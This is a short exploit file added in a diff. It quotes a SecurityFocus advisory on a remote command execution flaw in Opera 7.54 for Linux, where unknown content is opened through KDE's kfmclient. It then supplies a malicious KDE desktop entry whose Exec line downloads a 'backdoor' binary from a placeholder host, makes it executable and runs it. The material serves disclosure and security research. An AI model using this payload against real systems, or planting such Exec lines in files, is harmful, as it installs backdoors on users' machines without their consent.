@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/11901/info
+
+It is reported that Opera for Linux is susceptible to a remote command execution vulnerability. This issue is due to a default configuration setting in Opera that utilizes the KDE 'kfmclient' utility to open unknown content.
+
+Exploitation of this issue allows attacker-supplied commands to be executed in the context of the user running Opera.
+
+Version 7.54 of Opera for Linux with KDE version 3.2.3 is reported vulnerable to this issue. Other versions may also be affected.
+
+# KDE Config File
+[KDE Desktop Entry]
+SwallowExec=
+SwallowTitle=
+BinaryPattern=
+MimeType=
+Exec=/bin/bash -c wget\thttp://malicious_site/backdoor;chmod\t777\tbackdoor;./backdoor
+Icon=
+TerminalOptions=
+Path=
+Type=Application
+Terminal=0
